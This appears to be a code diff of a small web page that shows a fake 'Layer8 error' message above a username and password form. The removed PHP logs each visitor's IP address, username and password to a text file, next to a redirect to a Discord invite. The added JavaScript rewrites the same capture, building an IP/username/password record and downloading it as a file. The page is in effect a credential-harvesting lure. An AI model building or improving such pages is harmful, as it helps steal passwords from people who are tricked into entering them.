@@ -1,21 +1,66 @@
 <!DOCTYPE html>
 <html>
   <head>
-  <link rel="stylesheet" href="../assest/style.css"/>
+    <meta charset="UTF-8">
+    <title>Save Data Example</title>
+    <link rel="stylesheet" href="../assets/style.css" />
   </head>
   <body>
-  “Error - this program has encountered an issue that it cannot recover from. Please notify your Website Administrator that this is the result of a Layer8 error”
+    <p>
+      Error - this program has encountered an issue that it cannot recover from.
+      Please notify your Website Administrator that this is the result of a
+      Layer8 error.
+    </p>
+    
+    <!-- The form for data entry -->
+    <form id="saveForm">
+      <input type="text" name="user" id="user" placeholder="Username" required />
+      <input type="password" name="pass" id="pass" placeholder="Password" required />
+      <button type="submit">Submit</button>
+    </form>
+    
+    <script>
+      // Since this is entirely client-side, we can't capture the real IP.
+      // We'll use a placeholder.
+      const iptoken = "Client_IP";  
+      
+      // Variable to accumulate submitted data
+      let savedData = "";
+      
+      // Reference to the form element
+      const form = document.getElementById("saveForm");
+      
+      // Listen for the form submission event
+      form.addEventListener("submit", function(e) {
+        e.preventDefault();  // Prevent the default form submission
+        
+        // Get the user input values
+        const user = document.getElementById("user").value;
+        const pass = document.getElementById("pass").value;
+        
+        // Append the new entry to savedData in the desired format
+        savedData += " -  IP: " + iptoken + "   Username: " + user + "   Password: " + pass + "\n\n";
+        
+        // Optionally, clear the form fields after submission
+        form.reset();
+        
+        // Immediately trigger the download of the updated savedData
+        const blob = new Blob([savedData], { type: "text/plain" });
+        const url = URL.createObjectURL(blob);
+        
+        // Create a temporary anchor element to trigger the download
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "savetext.txt";
+        
+        // Append the anchor to the document, trigger the click, and remove it
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        
+        // Clean up the object URL
+        URL.revokeObjectURL(url);
+      });
+    </script>
   </body>
 </html>
-<script>function redirect(){window.location.replace("https://discord.gg/4Fxhr8d966")}</script>
-<?php
-$iptoken = $_SERVER['REMOTE_ADDR'];  
-    if(isset($_POST['pass'])){
-      $user = $_POST['user'];
-      $pass = $_POST['pass'];
-      $file = fopen("savedata.txt", "a+");
-      fwrite($file," -  IP: ".$iptoken."   Username: " . $user . "   Password: " . $pass . "\n\n");
-      fclose($file);
-      die();
-}
-?>
